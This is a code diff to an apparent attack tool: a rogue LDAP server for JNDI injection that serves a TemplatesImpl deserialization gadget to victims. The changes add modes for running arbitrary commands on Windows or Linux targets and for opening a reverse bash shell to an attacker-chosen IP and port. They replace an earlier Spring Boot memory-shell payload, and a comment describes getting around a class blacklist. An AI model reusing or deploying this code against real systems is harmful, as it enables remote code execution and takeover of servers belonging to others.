@@ -55,22 +55,50 @@ public class ldapserver {
     }
     private static final String LDAP_BASE = "dc=example,dc=com";
 
+    private static String version;
+
+    private static String command;
+
+    private static String ip;
+
+    private static String port;
+    private static boolean isReverseShell=false;
+
     public static void main(String[] tmp_args) throws Exception {
 
         String[] args = new String[]{"http://127.0.0.1/jndi/#EvilClass"};
-        int port = 19001;
+        if (tmp_args.length == 0 ){
+            System.out.println("请至少输入目标操作系统.linux/windows");
+            return;
+        } else if (tmp_args.length == 1) {
+            System.out.println("请输入要执行的命令");
+            return;
+        } else if (tmp_args.length == 3){
+            isReverseShell = true;
+            ip = tmp_args[1];
+            port = tmp_args[2];
+            System.out.println("反弹shell模式");
+        }else if (tmp_args.length ==2){
+            command = tmp_args[1];
+            System.out.println("执行命令模式");
+        }else {
+            System.out.println("参数错误");
+            return;
+        }
+        version = tmp_args[0];
+
         try {
             InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
             config.setListenerConfigs(new InMemoryListenerConfig(
                     "listen", //$NON-NLS-1$
                     InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
-                    port,
+                    19001,
                     ServerSocketFactory.getDefault(),
                     SocketFactory.getDefault(),
                     (SSLSocketFactory) SSLSocketFactory.getDefault()));
             config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
-            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
+            System.out.println("Listening on 0.0.0.0:" + 19001); //$NON-NLS-1$
             ds.startListening();
 
         } catch (Exception e) {
@@ -110,8 +138,19 @@ public class ldapserver {
 
             List<Object> list = new ArrayList<>();
 
-            TemplatesImpl templates = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
+            TemplatesImpl templates = null;
 
+            if(isReverseShell){
+                templates = GadgetUtils.getTemplatesImplReverseBashShell(ip,port);
+                System.out.println("开始反弹Bash Shell,目标为："+ip+":"+port);
+            }else{
+                if(version.equals("windows")){
+                    templates = GadgetUtils.templatesImplLocalWindows(command);
+                } else if (version.equals("linux")) {
+                    templates = GadgetUtils.getTemplatesImpl(command);
+                }
+            }
+            System.out.println(templates);
             list.add(templates);          //第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测
 
             JSONArray jsonArray = new JSONArray();
